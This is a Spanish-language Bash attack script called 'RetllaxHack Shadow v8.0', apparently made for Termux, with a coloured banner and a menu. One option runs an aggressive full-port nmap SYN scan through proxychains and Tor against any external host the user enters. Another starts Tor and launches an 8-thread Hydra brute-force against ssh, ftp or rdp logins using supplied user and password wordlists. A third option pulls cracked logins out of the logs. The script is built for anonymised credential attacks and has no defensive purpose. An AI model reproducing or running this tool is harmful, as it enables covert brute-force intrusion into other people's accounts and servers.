#!/usr/bin/env bash

# RetllaxHack Shadow (v8.0)
# Escaneo sin límites + Hydra con Tor (No Root)

# ===== CONFIGURACIÓN RGB =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")  # Rojo, Verde, Naranja, Azul, Magenta, Amarillo
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER ANIMADO =====
function show_banner {
  clear
  echo
  rgb " ██▀███  ▓█████ ▄▄▄       ██▓     ██░ ██  ▄▄▄     ▓██   ██▓"
  rgb "▓██ ▒ ██▒▓█   ▀▒████▄    ▓██▒    ▓██░ ██▒▒████▄    ▒██  ██▒"
  rgb "▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██  ▀█▄   ▒██ ██░"
  rgb "▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██▄▄▄▄██  ░ ▐██▓░"
  rgb "░██▓ ▒██▒░▒████▒▓█   ▓██▒░██████▒░▓█▒░██▓ ▓█   ▓██▒ ░ ██▒▓░"
  rgb "░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░  ██▒▒▒ "
  rgb "  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░▓██ ░▒░ "
  rgb "  ░░   ░    ░    ░   ▒     ░ ░    ░  ░░ ░  ░   ▒   ▒ ▒ ░░  "
  rgb "   ░        ░  ░     ░  ░    ░  ░ ░  ░  ░      ░  ░░ ░     "
  rgb "                                                        ░ ░ "
  echo
  rgb "============= SHADOW EDITION v8.0 ============="
  rgb "=== FUERZA BRUTA TOTAL + PROXYCHAIN/TOR ==="
  echo
}

# ===== ESCANEO SIN LIMITES =====
function shadow_scan {
  read -p "$(rgb "[?] IP/Dominio (externo): ")" target
  
  rgb "[~] Iniciando escaneo sigiloso con Tor..."
  proxychains -q nmap -Pn -T5 -sS -p- --min-rate 1000 $target | tee scan_shadow.log
  
  rgb "[+] Puertos abiertos:"
  grep "open" scan_shadow.log | while read line; do
    rgb "[+] $line"
  done
}

# ===== HYDRA CON TOR (8 HILOS) =====
function hydra_shadow {
  rgb "[!] MODO HYDRA TOR ACTIVADO (8 Hilos)"
  read -p "$(rgb "[?] Objetivo: ")" target
  read -p "$(rgb "[?] Servicio (ssh/ftp/rdp): ")" service
  read -p "$(rgb "[?] Wordlist usuarios: ")" users
  read -p "$(rgb "[?] Wordlist contraseñas: ")" pass
  
  rgb "[~] Configurando Tor + Hydra..."
  killall tor 2>/dev/null
  tor &>/dev/null &
  sleep 5
  
  rgb "[~] Iniciando ataque con 8 hilos..."
  proxychains -q hydra -v -V -t 8 -w 0 -I -L $users -P $pass $target $service | tee hydra_shadow.log
  
  rgb "[✔] Ataque completado. Ver hydra_shadow.log"
}

# ===== MENÚ SHADOW =====
function shadow_menu {
  while true; do
    show_banner
    rgb "1) Escaneo Sigiloso (Tor)"
    rgb "2) Hydra Shadow (8 Hilos + Tor)"
    rgb "3) Ver Resultados"
    rgb "4) Salir"
    echo
    read -p "$(rgb "[?] Opción: ")" opt

    case $opt in
      1) shadow_scan ;;
      2) hydra_shadow ;;
      3) 
        [ -f "scan_shadow.log" ] && cat scan_shadow.log | grep --color "open"
        [ -f "hydra_shadow.log" ] && cat hydra_shadow.log | grep --color "login:"
        ;;
      4) exit 0 ;;
      *) rgb "[!] Opción inválida"; sleep 1 ;;
    esac
    read -p "$(rgb "[?] Enter para continuar...")"
  done
}

# ===== INICIO =====
show_banner
rgb "[~] Verificando dependencias..."
command -v tor >/dev/null || pkg install tor -y
command -v proxychains >/dev/null || pkg install proxychains-ng -y
command -v hydra >/dev/null || pkg install hydra -y

shadow_menu
